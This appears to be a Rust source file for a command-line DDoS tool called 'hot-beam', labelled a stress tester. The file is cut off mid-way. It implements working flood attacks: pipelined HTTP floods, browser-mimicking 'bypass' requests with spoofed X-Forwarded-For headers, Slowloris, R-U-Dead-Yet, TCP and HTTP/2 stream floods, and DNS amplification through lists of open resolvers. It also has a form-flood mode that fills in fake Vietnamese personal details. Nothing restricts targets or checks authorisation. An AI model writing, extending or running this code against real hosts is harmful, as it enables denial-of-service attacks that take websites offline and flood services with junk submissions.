use clap::{Parser, Subcommand, ValueEnum};
use colored::*;
use rand::Rng;
use reqwest::Client;
use std::collections::HashMap;
use std::sync::atomic::{AtomicBool, AtomicU64, Ordering};
use std::sync::Arc;
use std::time::{Duration, Instant};
use tokio::io::AsyncWriteExt;
use tokio::net::TcpStream;
use tokio::net::UdpSocket;
use tokio_rustls::TlsConnector;

#[derive(Parser)]
#[command(name = "hot-beam", about = "Network stress testing tool")]
struct Cli {
    #[command(subcommand)]
    command: Option<Commands>,

    #[arg(global = false)]
    bare_target: Option<String>,
}

#[derive(Subcommand)]
enum Commands {
    Fire(FireArgs),
    Repeat(RepeatArgs),
}

#[derive(Parser)]
struct FireArgs {
    target: String,
    #[arg(short, long, default_value = "all")]
    method: AttackMethod,
    #[arg(short, long, default_value_t = 500)]
    threads: usize,
    #[arg(short, long, default_value_t = 120)]
    duration: u64,
    #[arg(long, default_value_t = 512)]
    packet_size: usize,
    #[arg(long, default_value_t = 500)]
    packet_delay: u64,
    #[arg(long, help = "File with open DNS resolver IPs, one per line")]
    dns_slaves: Option<String>,
    #[arg(long)]
    no_recon: bool,
    #[arg(long)]
    json: bool,
    #[arg(short = 'X', long, help = "HTTP method for repeat mode (GET/POST/PUT/DELETE/PATCH)")]
    request_method: Option<String>,
    #[arg(short = 'H', long = "header", help = "Header 'Key: Value' (repeatable)")]
    headers: Vec<String>,
    #[arg(short = 'B', long = "body", help = "Request body string")]
    body: Option<String>,
    #[arg(long = "body-file", help = "Read request body from file")]
    body_file: Option<String>,
    #[arg(long = "req-file", help = "Raw HTTP request file")]
    req_file: Option<String>,
    #[arg(long = "path", help = "Request path override")]
    req_path: Option<String>,
    #[arg(long, help = "Randomize query param per request")]
    rand_query: bool,
}

#[derive(Parser)]
#[command(
    about = "Replay custom HTTP requests at high speed with template variables",
    long_about = "Replay custom HTTP requests at high speed with template variables.\n\n\
        Sends the same request repeatedly with optional randomized fields.\n\
        Useful for form flood, API stress testing, and replay attacks.\n\n\
        Template variables (auto-replaced per request):\n  \
          {{rand_name}}   - Random Vietnamese name\n  \
          {{rand_phone}}  - Random VN phone number (09x, 03x)\n  \
          {{rand_email}}  - Random email address\n  \
          {{rand_addr}}   - Random VN street address\n  \
          {{rand_str}}    - Random 10-char alphanumeric string\n  \
          {{rand_int}}    - Random integer 1-99999\n  \
          {{seq}}         - Sequential counter (0, 1, 2, ...)\n\n\
        Examples:\n  \
          hot-beam repeat https://api.example.com/form -X POST \\\n    \
            -H 'Content-Type: application/json' \\\n    \
            -B '{\"name\":\"{{rand_name}}\",\"phone\":\"{{rand_phone}}\"}' \\\n    \
            -t 100 -d 60\n\n  \
          hot-beam repeat https://api.example.com/form \\\n    \
            --body-file payload.json -t 200 -d 300\n\n  \
          hot-beam repeat https://api1.example.com/sendform \\\n    \
            -e https://api2.example.com/sendform \\\n    \
            --body-file payload.json -t 100"
)]
struct RepeatArgs {
    target: String,
    #[arg(short = 'X', long = "method", default_value = "GET")]
    http_method: String,
    #[arg(short = 'H', long = "header")]
    headers: Vec<String>,
    #[arg(short = 'B', long = "body")]
    body: Option<String>,
    #[arg(long = "body-file")]
    body_file: Option<String>,
    #[arg(long = "req-file")]
    req_file: Option<String>,
    #[arg(short = 'e', long = "endpoint")]
    endpoints: Vec<String>,
    #[arg(short, long, default_value_t = 50)]
    threads: usize,
    #[arg(short, long, default_value_t = 120)]
    duration: u64,
    #[arg(long)]
    rand_query: bool,
    #[arg(long)]
    no_recon: bool,
    #[arg(long)]
    json: bool,
    #[arg(long)]
    dry_run: bool,
}

#[derive(Clone, Copy, ValueEnum, PartialEq)]
enum AttackMethod {
    Flood,
    Bypass,
    Slowloris,
    Rudy,
    Tcp,
    H2flood,
    Repeat,
    DnsAmp,
    All,
}

impl std::fmt::Display for AttackMethod {
    fn fmt(&self, f: &mut std::fmt::Formatter) -> std::fmt::Result {
        match self {
            AttackMethod::Flood => write!(f, "flood"),
            AttackMethod::Bypass => write!(f, "bypass"),
            AttackMethod::Slowloris => write!(f, "slowloris"),
            AttackMethod::Rudy => write!(f, "rudy"),
            AttackMethod::Tcp => write!(f, "tcp"),
            AttackMethod::H2flood => write!(f, "h2flood"),
            AttackMethod::Repeat => write!(f, "repeat"),
            AttackMethod::DnsAmp => write!(f, "dns-amp"),
            AttackMethod::All => write!(f, "all"),
        }
    }
}

// ---------------------------------------------------------------------------
// Shared stats - dual counters: attempted vs wire-sent
// ---------------------------------------------------------------------------
struct Stats {
    total_attempted: AtomicU64,
    total_wire_sent: AtomicU64,
    total_success: AtomicU64,
    total_fail: AtomicU64,
    bytes_sent: AtomicU64,
    rps_counter: AtomicU64,
    wire_rps_counter: AtomicU64,
    peak_rps: AtomicU64,
    peak_wire_rps: AtomicU64,
    current_rps: AtomicU64,
    current_wire_rps: AtomicU64,
    status_2xx: AtomicU64,
    status_3xx: AtomicU64,
    status_4xx: AtomicU64,
    status_5xx: AtomicU64,
}

impl Stats {
    fn new() -> Self {
        Self {
            total_attempted: AtomicU64::new(0),
            total_wire_sent: AtomicU64::new(0),
            total_success: AtomicU64::new(0),
            total_fail: AtomicU64::new(0),
            bytes_sent: AtomicU64::new(0),
            rps_counter: AtomicU64::new(0),
            wire_rps_counter: AtomicU64::new(0),
            peak_rps: AtomicU64::new(0),
            peak_wire_rps: AtomicU64::new(0),
            current_rps: AtomicU64::new(0),
            current_wire_rps: AtomicU64::new(0),
            status_2xx: AtomicU64::new(0),
            status_3xx: AtomicU64::new(0),
            status_4xx: AtomicU64::new(0),
            status_5xx: AtomicU64::new(0),
        }
    }

    fn hit_sent(&self, nbytes: u64) {
        self.total_attempted.fetch_add(1, Ordering::Relaxed);
        self.total_wire_sent.fetch_add(1, Ordering::Relaxed);
        self.total_success.fetch_add(1, Ordering::Relaxed);
        self.bytes_sent.fetch_add(nbytes, Ordering::Relaxed);
        self.rps_counter.fetch_add(1, Ordering::Relaxed);
        self.wire_rps_counter.fetch_add(1, Ordering::Relaxed);
    }

    fn hit_attempted(&self) {
        self.total_attempted.fetch_add(1, Ordering::Relaxed);
        self.total_fail.fetch_add(1, Ordering::Relaxed);
        self.rps_counter.fetch_add(1, Ordering::Relaxed);
    }

    fn hit_status(&self, code: u16) {
        match code {
            200..=299 => { self.status_2xx.fetch_add(1, Ordering::Relaxed); }
            300..=399 => { self.status_3xx.fetch_add(1, Ordering::Relaxed); }
            400..=499 => { self.status_4xx.fetch_add(1, Ordering::Relaxed); }
            500..=599 => { self.status_5xx.fetch_add(1, Ordering::Relaxed); }
            _ => {}
        }
    }

    fn hit_wire_bulk(&self, count: u64, nbytes: u64) {
        self.total_attempted.fetch_add(count, Ordering::Relaxed);
        self.total_wire_sent.fetch_add(count, Ordering::Relaxed);
        self.total_success.fetch_add(count, Ordering::Relaxed);
        self.bytes_sent.fetch_add(nbytes, Ordering::Relaxed);
        self.rps_counter.fetch_add(count, Ordering::Relaxed);
        self.wire_rps_counter.fetch_add(count, Ordering::Relaxed);
    }

    fn snapshot_rps(&self) -> (u64, u64) {
        let rps = self.rps_counter.swap(0, Ordering::Relaxed);
        let wire_rps = self.wire_rps_counter.swap(0, Ordering::Relaxed);
        self.current_rps.store(rps, Ordering::Relaxed);
        self.current_wire_rps.store(wire_rps, Ordering::Relaxed);
        let peak = self.peak_rps.load(Ordering::Relaxed);
        if rps > peak { self.peak_rps.store(rps, Ordering::Relaxed); }
        let wire_peak = self.peak_wire_rps.load(Ordering::Relaxed);
        if wire_rps > wire_peak { self.peak_wire_rps.store(wire_rps, Ordering::Relaxed); }
        (rps, wire_rps)
    }
}

// ---------------------------------------------------------------------------
// Shared helpers
// ---------------------------------------------------------------------------
const USER_AGENTS: &[&str] = &[
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.2 Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 18_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0",
];

const REFERERS: &[&str] = &[
    "https://www.google.com/search?q=", "https://www.bing.com/search?q=",
    "https://duckduckgo.com/?q=", "https://www.youtube.com/", "",
];

const VN_FIRST: &[&str] = &["Nguyen", "Tran", "Le", "Pham", "Hoang", "Vu", "Dang", "Bui", "Do", "Ngo"];
const VN_MID: &[&str] = &["Van", "Thi", "Minh", "Duc", "Anh", "Hoa", "Hai", "Thanh", "Hung", "Linh"];
const VN_LAST: &[&str] = &["An", "Binh", "Chi", "Dung", "Em", "Giang", "Hieu", "Khanh", "Long", "Mai", "Nam", "Oanh", "Phuc", "Quang", "Son", "Tien", "Uyen", "Vy"];
const VN_PREFIX: &[&str] = &["090", "091", "093", "097", "098", "032", "033", "034", "035", "036"];
const VN_STREET: &[&str] = &["Nguyen Hue", "Le Loi", "Tran Hung Dao", "Hai Ba Trung", "Pasteur", "Dong Khoi", "Nam Ky Khoi Nghia", "Vo Van Tan", "Ly Tu Trong", "Nguyen Trai"];
const VN_DIST: &[&str] = &["Quan 1", "Quan 3", "Quan 5", "Quan 7", "Quan 10", "Binh Thanh", "Go Vap", "Thu Duc", "Phu Nhuan", "Tan Binh"];

fn rand_str(n: usize) -> String {
    let mut rng = rand::thread_rng();
    (0..n).map(|_| rng.sample(rand::distributions::Alphanumeric) as char).collect()
}

fn rand_path() -> String {
    let mut rng = rand::thread_rng();
    let exts = ["", "", ".js", ".css", ".png", ".jpg", ".json", ".html"];
    let segments: usize = rng.gen_range(1..=3);
    let parts: Vec<String> = (0..segments).map(|_| rand_str(rng.gen_range(3..=12))).collect();
    format!("{}{}", parts.join("/"), exts[rng.gen_range(0..exts.len())])
}

fn rand_query() -> String {
    let mut rng = rand::thread_rng();
    let n = rng.gen_range(1..=4);
    (0..n).map(|_| format!("{}={}", rand_str(rng.gen_range(2..=6)), rand_str(rng.gen_range(3..=10)))).collect::<Vec<_>>().join("&")
}

fn rand_ua() -> &'static str {
    USER_AGENTS[rand::thread_rng().gen_range(0..USER_AGENTS.len())]
}

fn rand_vn_name() -> String {
    let mut rng = rand::thread_rng();
    format!("{} {} {}",
        VN_FIRST[rng.gen_range(0..VN_FIRST.len())],
        VN_MID[rng.gen_range(0..VN_MID.len())],
        VN_LAST[rng.gen_range(0..VN_LAST.len())])
}

fn rand_vn_phone() -> String {
    let mut rng = rand::thread_rng();
    let prefix = VN_PREFIX[rng.gen_range(0..VN_PREFIX.len())];
    let suffix: String = (0..7).map(|_| char::from(b'0' + rng.gen_range(0..10))).collect();
    format!("{}{}", prefix, suffix)
}

fn rand_vn_addr() -> String {
    let mut rng = rand::thread_rng();
    format!("{} {}, {}, TP.HCM",
        rng.gen_range(1..=999),
        VN_STREET[rng.gen_range(0..VN_STREET.len())],
        VN_DIST[rng.gen_range(0..VN_DIST.len())])
}

fn rand_email() -> String {
    format!("{}@{}.com", rand_str(8).to_lowercase(), rand_str(5).to_lowercase())
}

fn render_template(s: &str, seq: u64) -> String {
    let mut out = s.to_string();
    while out.contains("{{rand_name}}") {
        out = out.replacen("{{rand_name}}", &rand_vn_name(), 1);
    }
    while out.contains("{{rand_phone}}") {
        out = out.replacen("{{rand_phone}}", &rand_vn_phone(), 1);
    }
    while out.contains("{{rand_email}}") {
        out = out.replacen("{{rand_email}}", &rand_email(), 1);
    }
    while out.contains("{{rand_addr}}") {
        out = out.replacen("{{rand_addr}}", &rand_vn_addr(), 1);
    }
    while out.contains("{{rand_str}}") {
        out = out.replacen("{{rand_str}}", &rand_str(10), 1);
    }
    while out.contains("{{rand_int}}") {
        let v = rand::thread_rng().gen_range(1..=99999);
        out = out.replacen("{{rand_int}}", &v.to_string(), 1);
    }
    out = out.replace("{{seq}}", &seq.to_string());
    out
}

// ---------------------------------------------------------------------------
// OS tuning (best-effort, silent if not root)
// ---------------------------------------------------------------------------
fn tune_os_params() {
    let is_root = unsafe { libc::geteuid() } == 0;
    let params: &[(&str, &str)] = &[
        ("/proc/sys/net/ipv4/ip_local_port_range", "1024 65535"),
        ("/proc/sys/net/ipv4/tcp_fin_timeout", "15"),
        ("/proc/sys/net/ipv4/tcp_tw_reuse", "1"),
        ("/proc/sys/net/core/netdev_max_backlog", "65535"),
    ];
    let mut applied = 0u32;
    for (path, val) in params {
        if std::fs::write(path, val).is_ok() { applied += 1; }
    }
    if applied > 0 {
        eprintln!("  {} Applied {} kernel tuning params", "✓".green(), applied);
    } else if !is_root {
        eprintln!("  {} Run as root for kernel tuning (port range, tcp_tw_reuse, etc.)", "⚠".yellow());
    }
}

// ---------------------------------------------------------------------------
// Pre-generated flood payloads (zero per-request allocation)
// ---------------------------------------------------------------------------
const FLOOD_PAYLOAD_COUNT: usize = 1000;
const FLOOD_PIPELINE_DEPTH: usize = 10;

fn generate_flood_payloads(host: &str, is_tls: bool) -> Vec<Vec<u8>> {
    let mut rng = rand::thread_rng();
    let scheme = if is_tls { "https" } else { "http" };
    let mut payloads = Vec::with_capacity(FLOOD_PAYLOAD_COUNT);
    for _ in 0..FLOOD_PAYLOAD_COUNT {
        let mut pipeline = Vec::with_capacity(4096);
        for _ in 0..FLOOD_PIPELINE_DEPTH {
            let path = rand_path();
            let query = rand_query();
            let ua = rand_ua();
            let use_post = rng.gen_ratio(1, 5);
            if use_post {
                let body_len = rng.gen_range(64..=512);
                let body: String = (0..body_len).map(|_| rng.sample(rand::distributions::Alphanumeric) as char).collect();
                let req = format!(
                    "POST /{}?{} HTTP/1.1\r\nHost: {}\r\nUser-Agent: {}\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: {}\r\nConnection: keep-alive\r\n\r\n{}",
                    path, query, host, ua, body_len, body
                );
                pipeline.extend_from_slice(req.as_bytes());
            } else {
                let req = format!(
                    "GET /{}?{} HTTP/1.1\r\nHost: {}\r\nUser-Agent: {}\r\nAccept: */*\r\nConnection: keep-alive\r\n\r\n",
                    path, query, host, ua
                );
                pipeline.extend_from_slice(req.as_bytes());
            }
        }
        payloads.push(pipeline);
    }
    let _ = scheme;
    payloads
}

// ---------------------------------------------------------------------------
// Request template (used by fire --method repeat)
// ---------------------------------------------------------------------------
#[derive(Clone)]
struct RequestTemplate {
    method: String,
    path: String,
    headers: HashMap<String, String>,
    body: Option<String>,
    rand_query: bool,
}

impl RequestTemplate {
    fn from_fire_args(args: &FireArgs, target: &str) -> Self {
        if let Some(ref file) = args.req_file {
            return Self::from_raw_file(file, args.rand_query);
        }
        let parsed = url::Url::parse(target).ok();
        let default_path = parsed.as_ref().map_or("/", |u| u.path()).to_string();
        let path = args.req_path.clone().unwrap_or(default_path);
        let method = args.request_method.clone().unwrap_or_else(|| {
            if args.body.is_some() || args.body_file.is_some() { "POST".to_string() } else { "GET".to_string() }
        }).to_uppercase();
        let mut headers = HashMap::new();
        for h in &args.headers {
            if let Some(pos) = h.find(':') {
                headers.insert(h[..pos].trim().to_string(), h[pos + 1..].trim().to_string());
            }
        }
        let body = if let Some(ref bf) = args.body_file {
            std::fs::read_to_string(bf).ok()
        } else {
            args.body.clone()
        };
        Self { method, path, headers, body, rand_query: args.rand_query }
    }

    fn from_raw_file(path: &str, rand_query: bool) -> Self {
        let content = std::fs::read_to_string(path).unwrap_or_default();
        let mut lines = content.lines();
        let first = lines.next().unwrap_or("GET / HTTP/1.1");
        let parts: Vec<&str> = first.splitn(3, ' ').collect();
        let method = parts.first().unwrap_or(&"GET").to_string();
        let req_path = parts.get(1).unwrap_or(&"/").to_string();
        let mut headers = HashMap::new();
        let mut body_lines = Vec::new();
        let mut in_body = false;
        for line in lines {
            if in_body {
                body_lines.push(line);
            } else if line.is_empty() {
                in_body = true;
            } else if let Some(pos) = line.find(':') {
                headers.insert(line[..pos].trim().to_string(), line[pos + 1..].trim().to_string());
            }
        }
        let body = if body_lines.is_empty() { None } else { Some(body_lines.join("\n")) };
        Self { method, path: req_path, headers, body, rand_query }
    }

    fn display_info(&self) -> String {
        let body_info = self.body.as_ref().map_or("(none)".to_string(), |b| {
            if b.len() > 60 { format!("{}...", &b[..60]) } else { b.clone() }
        });
        format!("{} {} | {} headers | body: {}", self.method, self.path, self.headers.len(), body_info)
    }
}

// ---------------------------------------------------------------------------
// Fire-mode attacks
// ---------------------------------------------------------------------------
fn build_mimic_request(client: &Client, target: &str) -> reqwest::RequestBuilder {
    let mut rng = rand::thread_rng();
    let url = format!("{}/{}?{}&_={}", target, rand_path(), rand_query(), rand_str(8));
    let ua = rand_ua();
    let referer = REFERERS[rng.gen_range(0..REFERERS.len())];
    let accept_langs = ["en-US,en;q=0.9", "vi-VN,vi;q=0.9,en;q=0.8", "ja-JP,ja;q=0.9,en;q=0.8"];
    let use_post = rng.gen_ratio(1, 5);
    let mut req = if use_post {
        client.post(&url).body(rand_str(rng.gen_range(64..=512))).header("content-type", "application/x-www-form-urlencoded")
    } else {
        client.get(&url)
    };
    req = req.header("user-agent", ua)
        .header("accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
        .header("accept-language", accept_langs[rng.gen_range(0..accept_langs.len())])
        .header("accept-encoding", "gzip, deflate, br")
        .header("sec-fetch-dest", "document").header("sec-fetch-mode", "navigate")
        .header("sec-fetch-site", "none").header("upgrade-insecure-requests", "1");
    if !referer.is_empty() { req = req.header("referer", format!("{}{}", referer, rand_str(8))); }
    if rng.gen_ratio(3, 10) {
        req = req.header("cookie", format!("_ga=GA1.2.{}.{}", rng.gen::<u32>(), rng.gen::<u32>()));
    }
    if rng.gen_ratio(2, 10) {
        req = req.header("x-forwarded-for", format!("{}.{}.{}.{}", rng.gen_range(1..224), rng.gen_range(0..256), rng.gen_range(0..256), rng.gen_range(1..255)));
    }
    req
}

// Raw fire-and-forget flood: pipeline N requests, never read response
async fn attack_raw_flood(
    host: &str, port: u16, is_tls: bool,
    tls_connector: &TlsConnector,
    payloads: &[Vec<u8>],
    stats: &Stats,
) {
    let addr = format!("{}:{}", host, port);
    let stream = match tokio::time::timeout(
        Duration::from_secs(2),
        TcpStream::connect(&addr),
    ).await {
        Ok(Ok(s)) => s,
        _ => { stats.hit_attempted(); return; }
    };

    let _ = stream.set_nodelay(true);

    let payload_idx = rand::thread_rng().gen_range(0..payloads.len());
    let payload = &payloads[payload_idx];
    let payload_len = payload.len() as u64;

    if is_tls {
        let server_name = match rustls::pki_types::ServerName::try_from(host.to_string()) {
            Ok(sn) => sn,
            Err(_) => { stats.hit_attempted(); return; }
        };
        let mut tls = match tokio::time::timeout(
            Duration::from_secs(3),
            tls_connector.connect(server_name, stream),
        ).await {
            Ok(Ok(t)) => t,
            _ => { stats.hit_attempted(); return; }
        };
        match tls.write_all(payload).await {
            Ok(_) => { let _ = tls.flush().await; stats.hit_wire_bulk(FLOOD_PIPELINE_DEPTH as u64, payload_len); }
            Err(_) => stats.hit_attempted(),
        }
    } else {
        let mut stream = stream;
        match stream.write_all(payload).await {
            Ok(_) => { let _ = stream.flush().await; stats.hit_wire_bulk(FLOOD_PIPELINE_DEPTH as u64, payload_len); }
            Err(_) => stats.hit_attempted(),
        }
    }
}

async fn attack_http_bypass(client: &Client, target: &str, stats: &Stats) {
    let req = build_mimic_request(client, target);
    match req.timeout(Duration::from_secs(5)).send().await {
        Ok(_) => stats.hit_sent(0),
        Err(_) => stats.hit_attempted(),
    }
}

async fn attack_fire_repeat(client: &Client, target: &str, stats: &Stats, tmpl: &RequestTemplate) {
    let parsed = url::Url::parse(target).unwrap();
    let base = format!("{}://{}", parsed.scheme(), parsed.host_str().unwrap_or(""));
    let path = if tmpl.rand_query {
        if tmpl.path.contains('?') {
            format!("{}&_cb={}", tmpl.path, rand_str(8))
        } else {
            format!("{}?_cb={}", tmpl.path, rand_str(8))
        }
    } else {
        tmpl.path.clone()
    };
    let url = format!("{}{}", base, path);
    let m = tmpl.method.as_str();
    let mut req = match m {
        "POST" => client.post(&url), "PUT" => client.put(&url),
        "DELETE" => client.delete(&url), "PATCH" => client.patch(&url),
        "HEAD" => client.head(&url), _ => client.get(&url),
    };
    for (k, v) in &tmpl.headers { req = req.header(k.as_str(), v.as_str()); }
    if !tmpl.headers.contains_key("User-Agent") && !tmpl.headers.contains_key("user-agent") {
        req = req.header("user-agent", rand_ua());
    }
    let body_len = tmpl.body.as_ref().map_or(0, |b| b.len() as u64);
    if let Some(ref body) = tmpl.body { req = req.body(body.clone()); }
    match req.timeout(Duration::from_secs(5)).send().await {
        Ok(resp) => { stats.hit_sent(body_len); stats.hit_status(resp.status().as_u16()); }
        Err(_) => stats.hit_attempted(),
    }
}

fn make_tls_connector() -> TlsConnector {
    let mut root_store = rustls::RootCertStore::empty();
    root_store.extend(webpki_roots::TLS_SERVER_ROOTS.iter().cloned());
    let mut config = rustls::ClientConfig::builder().with_root_certificates(root_store).with_no_client_auth();
    config.enable_sni = true;
    TlsConnector::from(Arc::new(config))
}

fn parse_host_port(target: &str) -> (String, u16, bool) {
    let url = if target.contains("://") {
        url::Url::parse(target).unwrap_or_else(|_| url::Url::parse(&format!("https://{}", target)).unwrap())
    } else { url::Url::parse(&format!("https://{}", target)).unwrap() };
    let host = url.host_str().unwrap_or("").to_string();
    let is_tls = url.scheme() == "https";
    let port = url.port().unwrap_or(if is_tls { 443 } else { 80 });
    (host, port, is_tls)
}

async fn open_tls_or_tcp(host: &str, port: u16, is_tls: bool, tls_conn: &TlsConnector) -> Option<Box<dyn tokio::io::AsyncWrite + Unpin + Send>> {
    let addr = format!("{}:{}", host, port);
    let stream = tokio::time::timeout(Duration::from_secs(2), TcpStream::connect(&addr)).await.ok()?.ok()?;
    let _ = stream.set_nodelay(true);
    if is_tls {
        let server_name = rustls::pki_types::ServerName::try_from(host.to_string()).ok()?;
        let tls = tokio::time::timeout(Duration::from_secs(3), tls_conn.connect(server_name, stream)).await.ok()?.ok()?;
        Some(Box::new(tls))
    } else {
        Some(Box::new(stream))
    }
}

async fn attack_slowloris(target: &str, stats: &Stats, stop: &AtomicBool, delay_ms: u64, tls_conn: &TlsConnector) {
    let (host, port, is_tls) = parse_host_port(target);
    let mut writer = match open_tls_or_tcp(&host, port, is_tls, tls_conn).await {
        Some(w) => w, None => { stats.hit_attempted(); return; }
    };
    let initial = format!("GET /{} HTTP/1.1\r\nHost: {}\r\n", rand_path(), host);
    if writer.write_all(initial.as_bytes()).await.is_err() { stats.hit_attempted(); return; }
    stats.hit_sent(initial.len() as u64);
    while !stop.load(Ordering::Relaxed) {
        let hdr = format!("X-{}: {}\r\n", rand_str(6), rand_str(12));
        if writer.write_all(hdr.as_bytes()).await.is_err() { stats.hit_attempted(); break; }
        stats.hit_sent(hdr.len() as u64);
        tokio::time::sleep(Duration::from_millis(delay_ms)).await;
    }
}

async fn attack_rudy(target: &str, stats: &Stats, stop: &AtomicBool, delay_ms: u64, tls_conn: &TlsConnector) {
    let (host, port, is_tls) = parse_host_port(target);
    let mut writer = match open_tls_or_tcp(&host, port, is_tls, tls_conn).await {
        Some(w) => w, None => { stats.hit_attempted(); return; }
    };
    let cl: usize = rand::thread_rng().gen_range(100_000..=1_000_000);
    let initial = format!(
        "POST /{} HTTP/1.1\r\nHost: {}\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: {}\r\nUser-Agent: {}\r\n\r\n",
        rand_path(), host, cl, rand_ua()
    );
    if writer.write_all(initial.as_bytes()).await.is_err() { stats.hit_attempted(); return; }
    stats.hit_sent(initial.len() as u64);
    let mut sent = 0usize;
    while !stop.load(Ordering::Relaxed) && sent < cl {
        if writer.write_all(rand_str(1).as_bytes()).await.is_err() { stats.hit_attempted(); break; }
        sent += 1; stats.hit_sent(1);
        tokio::time::sleep(Duration::from_millis(delay_ms)).await;
    }
}

async fn attack_tcp_flood(target: &str, stats: &Stats, psize: usize) {
    let (host, port, _) = parse_host_port(target);
    let addr = format!("{}:{}", host, port);
    let mut stream = match tokio::time::timeout(Duration::from_secs(2), TcpStream::connect(&addr)).await {
        Ok(Ok(s)) => s, _ => { stats.hit_attempted(); return; }
    };
    let _ = stream.set_nodelay(true);
    let (payload, bursts) = {
        let mut rng = rand::thread_rng();
        let p: Vec<u8> = (0..psize).map(|_| rng.gen()).collect();
        (p, rng.gen_range(1..=4usize))
    };
    for _ in 0..bursts {
        if stream.write_all(&payload).await.is_err() { stats.hit_attempted(); return; }
        stats.hit_sent(psize as u64);
    }
}

async fn attack_h2_flood(target: &str, stats: &Stats, tls_conn: &TlsConnector) {
    let (host, port, is_tls) = parse_host_port(target);
    let mut writer = match open_tls_or_tcp(&host, port, is_tls, tls_conn).await {
        Some(w) => w, None => { stats.hit_attempted(); return; }
    };
    let mut init = Vec::new();
    init.extend_from_slice(b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n");
    init.extend_from_slice(&[0, 0, 0, 4, 0, 0, 0, 0, 0]);
    if writer.write_all(&init).await.is_err() { stats.hit_attempted(); return; }
    tokio::time::sleep(Duration::from_millis(30)).await;
    let _ = writer.write_all(&[0, 0, 0, 4, 1, 0, 0, 0, 0]).await;
    let n = { rand::thread_rng().gen_range(50..=200) };
    let mut buf = Vec::with_capacity(n * 30);
    for i in 0..n {
        let sid = (1u32 + i as u32 * 2).to_be_bytes();
        let path = format!("/{}", rand_path());
        let pb = path.as_bytes();
        let plen = std::cmp::min(pb.len(), 64);
        let mut hdr = vec![0x82, 0x86, 0x44, plen as u8];
        hdr.extend_from_slice(&pb[..plen]);
        let hl = hdr.len() as u32;
        buf.push(((hl >> 16) & 0xFF) as u8); buf.push(((hl >> 8) & 0xFF) as u8); buf.push((hl & 0xFF) as u8);
        buf.push(0x01); buf.push(0x05); buf.extend_from_slice(&sid[1..]); buf.extend_from_slice(&hdr);
        buf.extend_from_slice(&[0, 0, 4, 3, 0]); buf.extend_from_slice(&sid[1..]); buf.extend_from_slice(&[0, 0, 0, 8]);
    }
    match writer.write_all(&buf).await {
        Ok(_) => stats.hit_wire_bulk(n as u64, buf.len() as u64),
        Err(_) => stats.hit_attempted(),
    }
}

fn build_dns_query(domain: &str, qtype: u16) -> Vec<u8> {
    let mut rng = rand::thread_rng();
    let txid: u16 = rng.gen();
    let mut pkt = Vec::with_capacity(64);
    pkt.extend_from_slice(&txid.to_be_bytes());
    pkt.extend_from_slice(&[0x01, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]);
    for label in domain.split('.') {
        pkt.push(label.len() as u8);
        pkt.extend_from_slice(label.as_bytes());
    }
    pkt.push(0x00);
    pkt.extend_from_slice(&qtype.to_be_bytes());
    pkt.extend_from_slice(&[0x00, 0x01]);
    pkt
}

const AMP_DOMAINS: &[&str] = &["paypal.com", "google.com", "facebook.com", "microsoft.com", "amazon.com", "apple.com", "twitter.com", "linkedin.com"];
const DNS_TXT: u16 = 16;
const DNS_ANY: u16 = 255;

fn load_dns_slaves(path: &str) -> Vec<std::net::SocketAddr> {
    let content = match std::fs::read_to_string(path) {
        Ok(c) => c,
        Err(e) => { eprintln!("  {} Cannot read dns_slaves file '{}': {}", "✗".red(), path, e); std::process::exit(1); }
    };
    let mut addrs = Vec::new();
    for line in content.lines() {
        let line = line.trim();
        if line.is_empty() || line.starts_with('#') { continue; }
        if line.contains(':') {
            if let Ok(addr) = line.parse::<std::net::SocketAddr>() { addrs.push(addr); }
        } else if let Ok(ip) = line.parse::<std::net::IpAddr>() {
            addrs.push(std::net::SocketAddr::new(ip, 53));
        }
    }
    if addrs.is_empty() { eprintln!("  {} No valid resolver IPs in '{}'", "✗".red(), path); std::process::exit(1); }
    addrs
}

async fn attack_dns_amp(resolvers: &[std::net::SocketAddr], stats: &Stats, target_ip: &str) {
    let (resolver, domain, query, query_len) = {
        let mut rng = rand::thread_rng();
        let resolver = resolvers[rng.gen_range(0..resolvers.len())];
        let domain = AMP_DOMAINS[rng.gen_range(0..AMP_DOMAINS.len())];
        let qtype = if rng.gen_bool(0.8) { DNS_TXT } else { DNS_ANY };
        let query = build_dns_query(domain, qtype);
        let query_len = query.len() as u64;
        (resolver, domain, query, query_len)
    };
    let sock = match UdpSocket::bind("0.0.0.0:0").await { Ok(s) => s, Err(_) => { stats.hit_attempted(); return; } };
    match sock.send_to(&query, resolver).await {
        Ok(_) => {
            let mut buf = [0u8; 4096];
            match tokio::time::timeout(Duration::from_secs(3), sock.recv_from(&mut buf)).await {
                Ok(Ok((resp_len, _))) => {
                    let amp_factor = resp_len as f64 / query_len as f64;
                    stats.hit_sent(resp_len as u64);
                    let total = stats.total_attempted.load(Ordering::Relaxed);
                    if total <= 3 {
                        eprintln!("  {} {}:{} -> {} {} (amp: {:.1}x) via {}",
                            "⚡".yellow(), target_ip, domain, format!("{}", resp_len).green(), "bytes".dimmed(), amp_factor, resolver);
                    }
                }
                _ => stats.hit_attempted(),
            }
        }
        Err(_) => stats.hit_attempted(),
    }
}

// ---------------------------------------------------------------------------
// Repeat-mode attack worker
